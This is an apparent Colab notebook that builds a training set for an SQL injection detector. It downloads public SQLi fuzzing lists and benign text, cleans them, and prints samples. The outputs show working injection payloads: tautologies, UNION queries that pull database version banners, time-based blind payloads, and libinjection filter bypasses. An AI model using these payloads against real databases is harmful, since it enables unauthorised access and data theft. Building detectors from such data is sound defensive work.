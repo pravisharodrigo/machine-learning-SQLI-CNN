{
  "nbformat": 4,
  "nbformat_minor": 0,
  "metadata": {
    "colab": {
      "provenance": []
    },
    "kernelspec": {
      "name": "python3",
      "display_name": "Python 3"
    },
    "language_info": {
      "name": "python"
    }
  },
  "cells": [
    {
      "cell_type": "markdown",
      "source": [
        "# New Section"
      ],
      "metadata": {
        "id": "W-ElV7JdbSjT"
      }
    },
    {
      "cell_type": "code",
      "execution_count": 124,
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "_j0JGQjKSWyf",
        "outputId": "21f42468-826c-40fa-df28-5d172bab30fc"
      },
      "outputs": [
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "[nltk_data] Downloading package punkt to /root/nltk_data...\n",
            "[nltk_data]   Package punkt is already up-to-date!\n",
            "[nltk_data] Downloading package stopwords to /root/nltk_data...\n",
            "[nltk_data]   Package stopwords is already up-to-date!\n",
            "[nltk_data] Downloading package wordnet to /root/nltk_data...\n",
            "[nltk_data]   Package wordnet is already up-to-date!\n"
          ]
        }
      ],
      "source": [
        "# import required packages\n",
        "\n",
        "import glob\n",
        "import time\n",
        "import pandas as pd\n",
        "# from xml.dom import minidom\n",
        "from nltk import ngrams\n",
        "from nltk.tokenize import sent_tokenize\n",
        "import nltk\n",
        "nltk.download('punkt')\n",
        "nltk.download('stopwords')\n",
        "nltk.download('wordnet')\n",
        "from nltk.stem import PorterStemmer\n",
        "from nltk.stem import PorterStemmer\n",
        "from nltk.tokenize import sent_tokenize, word_tokenize\n",
        "from nltk.stem import WordNetLemmatizer\n",
        "from nltk.corpus import stopwords \n",
        "from nltk.tokenize import word_tokenize"
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "import keras"
      ],
      "metadata": {
        "id": "D7hQCr_5Sc4V"
      },
      "execution_count": 125,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "import nltk\n",
        "import pandas as pd\n",
        "import os"
      ],
      "metadata": {
        "id": "vhWBOdPGSg-A"
      },
      "execution_count": 126,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "import requests \n",
        "file_url = \"https://raw.githubusercontent.com/foospidy/payloads/7749dd0bfcc64786feb22f578b978d2f8607e353/owasp/fuzzing_code_database/sqli/sqli.txt\"\n",
        "file_path_sqli = \"sqli.txt\"\n",
        "r = requests.get(file_url, stream = True) \n",
        "\n",
        "with open(file_path_sqli, \"wb\") as file: \n",
        "\tfor block in r.iter_content(chunk_size = 1024): \n",
        "\t\tif block: \n",
        "\t\t\tfile.write(block) "
      ],
      "metadata": {
        "id": "OAi_dAAyS2E8"
      },
      "execution_count": 127,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "def clean_sqli_data(data):\n",
        "    \n",
        "    for i in range(len(data)):\n",
        "        \n",
        "        data[i]=data[i].replace('\\n', '')\n",
        "        data[i]=data[i].replace('%20', ' ')\n",
        "        data[i]=data[i].replace('=', ' = ')\n",
        "        data[i]=data[i].replace('((', ' (( ')\n",
        "        data[i]=data[i].replace('))', ' )) ')\n",
        "        data[i]=data[i].replace('(', ' ( ')\n",
        "        data[i]=data[i].replace(')', ' ) ')\n",
        "    \n",
        "    return data"
      ],
      "metadata": {
        "id": "LXSE6XhTTTDu"
      },
      "execution_count": 128,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "# read data from file\n",
        "\n",
        "sql_lines_fuzzing=[]\n",
        "f = open(file_path_sqli, \"r\")\n",
        "for x in f:\n",
        "    sql_lines_fuzzing.append(x)"
      ],
      "metadata": {
        "id": "sQuMeuNzTad6"
      },
      "execution_count": 129,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "sql_lines_fuzzing=clean_sqli_data(sql_lines_fuzzing) "
      ],
      "metadata": {
        "id": "GpFKtGT6TVaS"
      },
      "execution_count": 130,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "sql_lines_fuzzing[:15]"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "FaNtFQQwTlS3",
        "outputId": "6600aded-35e3-4d12-d2e1-d11b775f1b07"
      },
      "execution_count": 131,
      "outputs": [
        {
          "output_type": "execute_result",
          "data": {
            "text/plain": [
              "[\"'sqlvuln\",\n",
              " \"'+sqlvuln\",\n",
              " 'sqlvuln;',\n",
              " ' ( sqlvuln ) ',\n",
              " \"a' or 1 = 1--\",\n",
              " '\"a\"\" or 1 = 1--\"',\n",
              " ' or a  =  a',\n",
              " \"a' or 'a'  =  'a\",\n",
              " '1 or 1 = 1',\n",
              " \"a' waitfor delay '0:0:10'--\",\n",
              " \"1 waitfor delay '0:0:10'--\",\n",
              " 'declare @q nvarchar  ( 4000 )  select @q  = ',\n",
              " '0x770061006900740066006F0072002000640065006C00610079002000270030003A0030003A',\n",
              " '0',\n",
              " '031003000270000']"
            ]
          },
          "metadata": {},
          "execution_count": 131
        }
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "import requests \n",
        "file_url = \"https://raw.githubusercontent.com/foospidy/payloads/master/other/sqli/camoufl4g3.txt\"\n",
        "file_path_camoufl4g3 = \"camoufl4g3.txt\"\n",
        "r = requests.get(file_url, stream = True) \n",
        "\n",
        "with open(file_path_camoufl4g3, \"wb\") as file: \n",
        "\tfor block in r.iter_content(chunk_size = 1024): \n",
        "\t\tif block: \n",
        "\t\t\tfile.write(block) "
      ],
      "metadata": {
        "id": "Uiyy4z-3T595"
      },
      "execution_count": 132,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "# read data from file\n",
        "\n",
        "sql_lines_camoufl4g3=[]\n",
        "f = open(file_path_camoufl4g3, \"r\")\n",
        "for x in f:\n",
        "    sql_lines_camoufl4g3.append(x)"
      ],
      "metadata": {
        "id": "nOiiGr4QULfN"
      },
      "execution_count": 133,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "sql_lines_camoufl4g3[:15] # data before cleaning"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "ebKhKrrQUMgz",
        "outputId": "f2787806-5755-4170-eebd-9f3c565e3d10"
      },
      "execution_count": 134,
      "outputs": [
        {
          "output_type": "execute_result",
          "data": {
            "text/plain": [
              "[\"'-'\\n\",\n",
              " \"' '\\n\",\n",
              " \"'&'\\n\",\n",
              " \"'^'\\n\",\n",
              " \"'*'\\n\",\n",
              " \"' or ''-'\\n\",\n",
              " \"' or '' '\\n\",\n",
              " \"' or ''&'\\n\",\n",
              " \"' or ''^'\\n\",\n",
              " \"' or ''*'\\n\",\n",
              " '\"-\"\\n',\n",
              " '\" \"\\n',\n",
              " '\"&\"\\n',\n",
              " '\"^\"\\n',\n",
              " '\"*\"\\n']"
            ]
          },
          "metadata": {},
          "execution_count": 134
        }
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "sql_lines_camoufl4g3=clean_sqli_data(sql_lines_camoufl4g3)"
      ],
      "metadata": {
        "id": "InRtFEz-UPbm"
      },
      "execution_count": 135,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "sql_lines_camoufl4g3[:15]  # data after cleaning"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "gN5237aXURNV",
        "outputId": "242ec0de-a0c6-480e-c916-48d57949612c"
      },
      "execution_count": 136,
      "outputs": [
        {
          "output_type": "execute_result",
          "data": {
            "text/plain": [
              "[\"'-'\",\n",
              " \"' '\",\n",
              " \"'&'\",\n",
              " \"'^'\",\n",
              " \"'*'\",\n",
              " \"' or ''-'\",\n",
              " \"' or '' '\",\n",
              " \"' or ''&'\",\n",
              " \"' or ''^'\",\n",
              " \"' or ''*'\",\n",
              " '\"-\"',\n",
              " '\" \"',\n",
              " '\"&\"',\n",
              " '\"^\"',\n",
              " '\"*\"']"
            ]
          },
          "metadata": {},
          "execution_count": 136
        }
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "import requests \n",
        "file_url = \"https://raw.githubusercontent.com/foospidy/payloads/master/other/sqli/libinjection-bypasses.txt\"\n",
        "file_path_libinjection = \"libinjection.txt\"\n",
        "r = requests.get(file_url, stream = True) \n",
        "\n",
        "with open(file_path_libinjection, \"wb\") as file: \n",
        "\tfor block in r.iter_content(chunk_size = 1024): \n",
        "\t\tif block: \n",
        "\t\t\tfile.write(block) "
      ],
      "metadata": {
        "id": "rT-0xNATUVEM"
      },
      "execution_count": 137,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "# read data from file\n",
        "\n",
        "sql_lines_bypasses=[]\n",
        "f = open(file_path_libinjection, \"r\")\n",
        "for x in f:\n",
        "    sql_lines_bypasses.append(x)"
      ],
      "metadata": {
        "id": "I0UThBkcUgG_"
      },
      "execution_count": 138,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "sql_lines_bypasses[:5] # before cleaning"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "L6sLK0dVUmIz",
        "outputId": "e7dbb3d2-ca8d-434a-b407-68be0e916548"
      },
      "execution_count": 139,
      "outputs": [
        {
          "output_type": "execute_result",
          "data": {
            "text/plain": [
              "['&()o1: select * from users where id=1 or (\\\\)=1 union select 1,@@VERSION -- 1\\n',\n",
              " '&(.)o: select * from users where id=1 or (\\\\.)=1 union select 1,@@VERSION -- 1\\n',\n",
              " '&(1&1: select * from users where id=1 or (\\\\+)=1 or 1=1 -- 1\\n',\n",
              " '&(1)o: select * from users where id=1 or (1)=1 union select 1,banner from v$version where rownum=1 -- 1\\n',\n",
              " '&(1UE: select * from users where id=1 or (\\\\+)=1 union select 1,@@VERSION -- 1\\n']"
            ]
          },
          "metadata": {},
          "execution_count": 139
        }
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "print(len(sql_lines_bypasses))"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "XJysjdcvUnN9",
        "outputId": "91221aca-101b-4e5a-e730-c7ce4250b612"
      },
      "execution_count": 140,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "474\n"
          ]
        }
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "sql_lines_bypasses=clean_sqli_data(sql_lines_bypasses)"
      ],
      "metadata": {
        "id": "Qf3txzhVUogI"
      },
      "execution_count": 141,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "sql_lines_bypasses[:5]  # data after cleaning"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "ZBhdP7NwUp-G",
        "outputId": "de943322-e345-45e6-8d54-70b42eca5905"
      },
      "execution_count": 142,
      "outputs": [
        {
          "output_type": "execute_result",
          "data": {
            "text/plain": [
              "['& (  ) o1: select * from users where id = 1 or  ( \\\\ )  = 1 union select 1,@@VERSION -- 1',\n",
              " '& ( . ) o: select * from users where id = 1 or  ( \\\\. )  = 1 union select 1,@@VERSION -- 1',\n",
              " '& ( 1&1: select * from users where id = 1 or  ( \\\\+ )  = 1 or 1 = 1 -- 1',\n",
              " '& ( 1 ) o: select * from users where id = 1 or  ( 1 )  = 1 union select 1,banner from v$version where rownum = 1 -- 1',\n",
              " '& ( 1UE: select * from users where id = 1 or  ( \\\\+ )  = 1 union select 1,@@VERSION -- 1']"
            ]
          },
          "metadata": {},
          "execution_count": 142
        }
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "# if don't want &(*)* sign in beginning of each sentence then run next code else don't\n",
        "\n",
        "for i in range(len(sql_lines_bypasses)):\n",
        "    sentence=sql_lines_bypasses[i]\n",
        "    sql_lines_bypasses[i]=sentence.split(':')[1]\n",
        "    "
      ],
      "metadata": {
        "id": "jj30FAVlUsA3"
      },
      "execution_count": 143,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "sql_lines_bypasses[:5]"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "pnwqZBTvUvIt",
        "outputId": "1f6ae457-3bbe-48cf-d1bb-14fa400febdf"
      },
      "execution_count": 144,
      "outputs": [
        {
          "output_type": "execute_result",
          "data": {
            "text/plain": [
              "[' select * from users where id = 1 or  ( \\\\ )  = 1 union select 1,@@VERSION -- 1',\n",
              " ' select * from users where id = 1 or  ( \\\\. )  = 1 union select 1,@@VERSION -- 1',\n",
              " ' select * from users where id = 1 or  ( \\\\+ )  = 1 or 1 = 1 -- 1',\n",
              " ' select * from users where id = 1 or  ( 1 )  = 1 union select 1,banner from v$version where rownum = 1 -- 1',\n",
              " ' select * from users where id = 1 or  ( \\\\+ )  = 1 union select 1,@@VERSION -- 1']"
            ]
          },
          "metadata": {},
          "execution_count": 144
        }
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "import requests \n",
        "file_url = \"https://raw.githubusercontent.com/foospidy/payloads/master/owasp/jbrofuzz/sqli.txt\"\n",
        "file_path_owasp = \"owasp.txt\"\n",
        "r = requests.get(file_url, stream = True) \n",
        "\n",
        "with open(file_path_owasp, \"wb\") as file: \n",
        "\tfor block in r.iter_content(chunk_size = 1024): \n",
        "\t\tif block: \n",
        "\t\t\tfile.write(block) "
      ],
      "metadata": {
        "id": "2UxQFvH2U6__"
      },
      "execution_count": 145,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "# read data from file\n",
        "\n",
        "sql_lines_owasp=[]\n",
        "f = open(file_path_owasp, \"r\")\n",
        "for x in f:\n",
        "    sql_lines_owasp.append(x)"
      ],
      "metadata": {
        "id": "IhzQdK3TWj5Z"
      },
      "execution_count": 146,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "sql_lines_owasp[0:15] # before cleaning"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "dycR2-jOWlkF",
        "outputId": "96e2d56d-63f4-47ef-d9a7-5f734f6a402b"
      },
      "execution_count": 147,
      "outputs": [
        {
          "output_type": "execute_result",
          "data": {
            "text/plain": [
              "['a\\n',\n",
              " \"a' \\n\",\n",
              " \"a' --\\n\",\n",
              " \"a' or 1=1; --\\n\",\n",
              " '@\\n',\n",
              " '?\\n',\n",
              " \"' and 1=0) union all\\n\",\n",
              " '? or 1=1 --\\n',\n",
              " \"x' and userid is NULL; --\\n\",\n",
              " \"x' and email is NULL; --\\n\",\n",
              " \"anything' or 'x'='x\\n\",\n",
              " \"x' and 1=(select count(*) from tabname); --\\n\",\n",
              " \"x' and members.email is NULL; --\\n\",\n",
              " \"x' or full_name like '%bob%\\n\",\n",
              " '23 or 1=1; --\\n']"
            ]
          },
          "metadata": {},
          "execution_count": 147
        }
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "print(len(sql_lines_owasp))"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "yiujrtnFWpCe",
        "outputId": "8686a7fb-3557-46ba-c408-8df2ed4da96b"
      },
      "execution_count": 148,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "167\n"
          ]
        }
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "sql_lines_owasp=clean_sqli_data(sql_lines_owasp)"
      ],
      "metadata": {
        "id": "fmdETEIoWq7M"
      },
      "execution_count": 149,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "sql_lines_owasp[:15] # after cleaning"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "RUR6VlXkWsMh",
        "outputId": "3d1b7088-0334-4586-e7a0-383f064a09eb"
      },
      "execution_count": 150,
      "outputs": [
        {
          "output_type": "execute_result",
          "data": {
            "text/plain": [
              "['a',\n",
              " \"a' \",\n",
              " \"a' --\",\n",
              " \"a' or 1 = 1; --\",\n",
              " '@',\n",
              " '?',\n",
              " \"' and 1 = 0 )  union all\",\n",
              " '? or 1 = 1 --',\n",
              " \"x' and userid is NULL; --\",\n",
              " \"x' and email is NULL; --\",\n",
              " \"anything' or 'x' = 'x\",\n",
              " \"x' and 1 =  ( select count ( * )  from tabname ) ; --\",\n",
              " \"x' and members.email is NULL; --\",\n",
              " \"x' or full_name like '%bob%\",\n",
              " '23 or 1 = 1; --']"
            ]
          },
          "metadata": {},
          "execution_count": 150
        }
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "import requests \n",
        "file_url = \"https://raw.githubusercontent.com/danielmiessler/SecLists/master/Fuzzing/SQLi/Generic-SQLi.txt\"\n",
        "file_path_Generic = \"Generic.txt\"\n",
        "r = requests.get(file_url, stream = True) \n",
        "\n",
        "with open(file_path_Generic, \"wb\") as file: \n",
        "\tfor block in r.iter_content(chunk_size = 1024): \n",
        "\t\tif block: \n",
        "\t\t\tfile.write(block) "
      ],
      "metadata": {
        "id": "JnBj-tVsWyRK"
      },
      "execution_count": 151,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "# read data from file\n",
        "\n",
        "sql_lines_Generic=[]\n",
        "f = open(file_path_Generic, \"r\")\n",
        "for x in f:\n",
        "    sql_lines_Generic.append(x)"
      ],
      "metadata": {
        "id": "PgaakmU1W3zB"
      },
      "execution_count": 152,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "sql_lines_Generic[:15] # before cleaning"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "cQOG3Ev3W6HJ",
        "outputId": "7820f155-86ce-4fc0-e037-fbb37bca9bf6"
      },
      "execution_count": 153,
      "outputs": [
        {
          "output_type": "execute_result",
          "data": {
            "text/plain": [
              "[\")%20or%20('x'='x\\n\",\n",
              " '%20or%201=1\\n',\n",
              " \"; execute immediate 'sel' || 'ect us' || 'er'\\n\",\n",
              " 'benchmark(10000000,MD5(1))#\\n',\n",
              " 'update\\n',\n",
              " '\";waitfor delay \\'0:0:__TIME__\\'--\\n',\n",
              " '1) or pg_sleep(__TIME__)--\\n',\n",
              " '||(elt(-3+5,bin(15),ord(10),hex(char(45))))\\n',\n",
              " '\"hi\"\") or (\"\"a\"\"=\"\"a\"\\n',\n",
              " 'delete\\n',\n",
              " 'like\\n',\n",
              " '\" or sleep(__TIME__)#\\n',\n",
              " 'pg_sleep(__TIME__)--\\n',\n",
              " '*(|(objectclass=*))\\n',\n",
              " 'declare @q nvarchar (200) 0x730065006c00650063 ...\\n']"
            ]
          },
          "metadata": {},
          "execution_count": 153
        }
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "print(len(sql_lines_Generic))"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "JTegx9ogW9Jq",
        "outputId": "b89d3ec7-de4f-4b1f-c46b-479e26211bf9"
      },
      "execution_count": 154,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "267\n"
          ]
        }
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "sql_lines_Generic=clean_sqli_data(sql_lines_Generic)"
      ],
      "metadata": {
        "id": "jQQaWRspW-uX"
      },
      "execution_count": 155,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "sql_lines_Generic[:15] # after cleaning"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "wHQm9UdjXAGU",
        "outputId": "26864072-9d6a-45a6-a400-5ad43cffdb03"
      },
      "execution_count": 156,
      "outputs": [
        {
          "output_type": "execute_result",
          "data": {
            "text/plain": [
              "[\" )  or  ( 'x' = 'x\",\n",
              " ' or 1 = 1',\n",
              " \"; execute immediate 'sel' || 'ect us' || 'er'\",\n",
              " 'benchmark ( 10000000,MD5 ( 1  )  )  #',\n",
              " 'update',\n",
              " '\";waitfor delay \\'0:0:__TIME__\\'--',\n",
              " '1 )  or pg_sleep ( __TIME__ ) --',\n",
              " '|| ( elt ( -3+5,bin ( 15 ) ,ord ( 10 ) ,hex ( char ( 45  )  )    )  )  ',\n",
              " '\"hi\"\" )  or  ( \"\"a\"\" = \"\"a\"',\n",
              " 'delete',\n",
              " 'like',\n",
              " '\" or sleep ( __TIME__ ) #',\n",
              " 'pg_sleep ( __TIME__ ) --',\n",
              " '* ( | ( objectclass = *  )  )  ',\n",
              " 'declare @q nvarchar  ( 200 )  0x730065006c00650063 ...']"
            ]
          },
          "metadata": {},
          "execution_count": 156
        }
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "import requests \n",
        "file_url = \"https://raw.githubusercontent.com/tungpv98/Detect-Sql-Injection-by-Machine-Learning/ebeb3287931677a3a42f11a7a08dbc13e374ff05/Sql-Injection/source/trainingdata/plain.txt\"\n",
        "file_path_plain = \"plain.txt\"\n",
        "r = requests.get(file_url, stream = True) \n",
        "\n",
        "with open(file_path_plain, \"wb\") as file: \n",
        "\tfor block in r.iter_content(chunk_size = 1024): \n",
        "\t\tif block: \n",
        "\t\t\tfile.write(block) "
      ],
      "metadata": {
        "id": "7DVopaiiXGcT"
      },
      "execution_count": 157,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "# function to remove stopwords\n",
        "\n",
        "stop_words = set(stopwords.words('english')) \n",
        "\n",
        "def fun_remove_stop_words(posts):\n",
        "\n",
        "    filtered=''\n",
        "    \n",
        "    for x in posts.split(' '):\n",
        "        if x not in stop_words:\n",
        "            filtered+=' '+x\n",
        "    \n",
        "    return filtered"
      ],
      "metadata": {
        "id": "4mQfPoxtYYQj"
      },
      "execution_count": 158,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "#read benign data\n",
        "df = pd.read_csv(file_path_plain, sep='Aw3s0meSc0t7', names=['benign'], header=None, engine='python')"
      ],
      "metadata": {
        "id": "5Q9n61rgXPOU"
      },
      "execution_count": 159,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "df"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/",
          "height": 423
        },
        "id": "5VnLot7sXyrs",
        "outputId": "88daa19d-91e9-43ef-d848-829d3266ea03"
      },
      "execution_count": 160,
      "outputs": [
        {
          "output_type": "execute_result",
          "data": {
            "text/plain": [
              "                                                 benign\n",
              "0                                   Add plain text here\n",
              "1                            “Ne te quaesiveris extra.”\n",
              "2           “Man is his own star; and the soul that can\n",
              "3                   Render an honest and a perfect man,\n",
              "4          Commands all light, all influence, all fate;\n",
              "...                                                 ...\n",
              "3689  comment6, http://www.ifreakinglovefishing.com/...\n",
              "3690  comment6, http://www.lissycakes.com/mysticism/...\n",
              "3691  comment6, http://www.nataliagallo.com/young-ad...\n",
              "3692  comment6, http://www.organikjoos.com/trivia/pd...\n",
              "3693  comment6, http://www.thejustincredible.com/que...\n",
              "\n",
              "[3694 rows x 1 columns]"
            ],
            "text/html": [
              "\n",
              "  <div id=\"df-1a9e7aab-6f06-4624-b566-7c4ad8a82a41\">\n",
              "    <div class=\"colab-df-container\">\n",
              "      <div>\n",
              "<style scoped>\n",
              "    .dataframe tbody tr th:only-of-type {\n",
              "        vertical-align: middle;\n",
              "    }\n",
              "\n",
              "    .dataframe tbody tr th {\n",
              "        vertical-align: top;\n",
              "    }\n",
              "\n",
              "    .dataframe thead th {\n",
              "        text-align: right;\n",
              "    }\n",
              "</style>\n",
              "<table border=\"1\" class=\"dataframe\">\n",
              "  <thead>\n",
              "    <tr style=\"text-align: right;\">\n",
              "      <th></th>\n",
              "      <th>benign</th>\n",
              "    </tr>\n",
              "  </thead>\n",
              "  <tbody>\n",
              "    <tr>\n",
              "      <th>0</th>\n",
              "      <td>Add plain text here</td>\n",
              "    </tr>\n",
              "    <tr>\n",
              "      <th>1</th>\n",
              "      <td>“Ne te quaesiveris extra.”</td>\n",
              "    </tr>\n",
              "    <tr>\n",
              "      <th>2</th>\n",
              "      <td>“Man is his own star; and the soul that can</td>\n",
              "    </tr>\n",
              "    <tr>\n",
              "      <th>3</th>\n",
              "      <td>Render an honest and a perfect man,</td>\n",
              "    </tr>\n",
              "    <tr>\n",
              "      <th>4</th>\n",
              "      <td>Commands all light, all influence, all fate;</td>\n",
              "    </tr>\n",
              "    <tr>\n",
              "      <th>...</th>\n",
              "      <td>...</td>\n",
              "    </tr>\n",
              "    <tr>\n",
              "      <th>3689</th>\n",
              "      <td>comment6, http://www.ifreakinglovefishing.com/...</td>\n",
              "    </tr>\n",
              "    <tr>\n",
              "      <th>3690</th>\n",
              "      <td>comment6, http://www.lissycakes.com/mysticism/...</td>\n",
              "    </tr>\n",
              "    <tr>\n",
              "      <th>3691</th>\n",
              "      <td>comment6, http://www.nataliagallo.com/young-ad...</td>\n",
              "    </tr>\n",
              "    <tr>\n",
              "      <th>3692</th>\n",
              "      <td>comment6, http://www.organikjoos.com/trivia/pd...</td>\n",
              "    </tr>\n",
              "    <tr>\n",
              "      <th>3693</th>\n",
              "      <td>comment6, http://www.thejustincredible.com/que...</td>\n",
              "    </tr>\n",
              "  </tbody>\n",
              "</table>\n",
              "<p>3694 rows × 1 columns</p>\n",
              "</div>\n",
              "      <button class=\"colab-df-convert\" onclick=\"convertToInteractive('df-1a9e7aab-6f06-4624-b566-7c4ad8a82a41')\"\n",
              "              title=\"Convert this dataframe to an interactive table.\"\n",
              "              style=\"display:none;\">\n",
              "        \n",
              "  <svg xmlns=\"http://www.w3.org/2000/svg\" height=\"24px\"viewBox=\"0 0 24 24\"\n",
              "       width=\"24px\">\n",
              "    <path d=\"M0 0h24v24H0V0z\" fill=\"none\"/>\n",
              "    <path d=\"M18.56 5.44l.94 2.06.94-2.06 2.06-.94-2.06-.94-.94-2.06-.94 2.06-2.06.94zm-11 1L8.5 8.5l.94-2.06 2.06-.94-2.06-.94L8.5 2.5l-.94 2.06-2.06.94zm10 10l.94 2.06.94-2.06 2.06-.94-2.06-.94-.94-2.06-.94 2.06-2.06.94z\"/><path d=\"M17.41 7.96l-1.37-1.37c-.4-.4-.92-.59-1.43-.59-.52 0-1.04.2-1.43.59L10.3 9.45l-7.72 7.72c-.78.78-.78 2.05 0 2.83L4 21.41c.39.39.9.59 1.41.59.51 0 1.02-.2 1.41-.59l7.78-7.78 2.81-2.81c.8-.78.8-2.07 0-2.86zM5.41 20L4 18.59l7.72-7.72 1.47 1.35L5.41 20z\"/>\n",
              "  </svg>\n",
              "      </button>\n",
              "      \n",
              "  <style>\n",
              "    .colab-df-container {\n",
              "      display:flex;\n",
              "      flex-wrap:wrap;\n",
              "      gap: 12px;\n",
              "    }\n",
              "\n",
              "    .colab-df-convert {\n",
              "      background-color: #E8F0FE;\n",
              "      border: none;\n",
              "      border-radius: 50%;\n",
              "      cursor: pointer;\n",
              "      display: none;\n",
              "      fill: #1967D2;\n",
              "      height: 32px;\n",
              "      padding: 0 0 0 0;\n",
              "      width: 32px;\n",
              "    }\n",
              "\n",
              "    .colab-df-convert:hover {\n",
              "      background-color: #E2EBFA;\n",
              "      box-shadow: 0px 1px 2px rgba(60, 64, 67, 0.3), 0px 1px 3px 1px rgba(60, 64, 67, 0.15);\n",
              "      fill: #174EA6;\n",
              "    }\n",
              "\n",
              "    [theme=dark] .colab-df-convert {\n",
              "      background-color: #3B4455;\n",
              "      fill: #D2E3FC;\n",
              "    }\n",
              "\n",
              "    [theme=dark] .colab-df-convert:hover {\n",
              "      background-color: #434B5C;\n",
              "      box-shadow: 0px 1px 3px 1px rgba(0, 0, 0, 0.15);\n",
              "      filter: drop-shadow(0px 1px 2px rgba(0, 0, 0, 0.3));\n",
              "      fill: #FFFFFF;\n",
              "    }\n",
              "  </style>\n",
              "\n",
              "      <script>\n",
              "        const buttonEl =\n",
              "          document.querySelector('#df-1a9e7aab-6f06-4624-b566-7c4ad8a82a41 button.colab-df-convert');\n",
              "        buttonEl.style.display =\n",
              "          google.colab.kernel.accessAllowed ? 'block' : 'none';\n",
              "\n",
              "        async function convertToInteractive(key) {\n",
              "          const element = document.querySelector('#df-1a9e7aab-6f06-4624-b566-7c4ad8a82a41');\n",
              "          const dataTable =\n",
              "            await google.colab.kernel.invokeFunction('convertToInteractive',\n",
              "                                                     [key], {});\n",
              "          if (!dataTable) return;\n",
              "\n",
              "          const docLinkHtml = 'Like what you see? Visit the ' +\n",
              "            '<a target=\"_blank\" href=https://colab.research.google.com/notebooks/data_table.ipynb>data table notebook</a>'\n",
              "            + ' to learn more about interactive tables.';\n",
              "          element.innerHTML = '';\n",
              "          dataTable['output_type'] = 'display_data';\n",
              "          await google.colab.output.renderOutput(dataTable, element);\n",
              "          const docLink = document.createElement('div');\n",
              "          docLink.innerHTML = docLinkHtml;\n",
              "          element.appendChild(docLink);\n",
              "        }\n",
              "      </script>\n",
              "    </div>\n",
              "  </div>\n",
              "  "
            ]
          },
          "metadata": {},
          "execution_count": 160
        }
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "plain_text=df['benign'].values"
      ],
      "metadata": {
        "id": "t3F91HMYX2SZ"
      },
      "execution_count": 161,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "plain_text[:5]"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "IeQQQ8InXyv7",
        "outputId": "dbbdb526-2d09-4ac1-dd82-058c2695a0a9"
      },
      "execution_count": 162,
      "outputs": [
        {
          "output_type": "execute_result",
          "data": {
            "text/plain": [
              "array(['Add plain text here', '“Ne te quaesiveris extra.”',\n",
              "       '“Man is his own star; and the soul that can',\n",
              "       'Render an honest and a perfect man,',\n",
              "       'Commands all light, all influence, all fate;'], dtype=object)"
            ]
          },
          "metadata": {},
          "execution_count": 162
        }
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "plain_text=plain_text[:-22] # removed last 22 records that were urls"
      ],
      "metadata": {
        "id": "009ut7YgX65n"
      },
      "execution_count": 163,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "len(plain_text)"
      ],
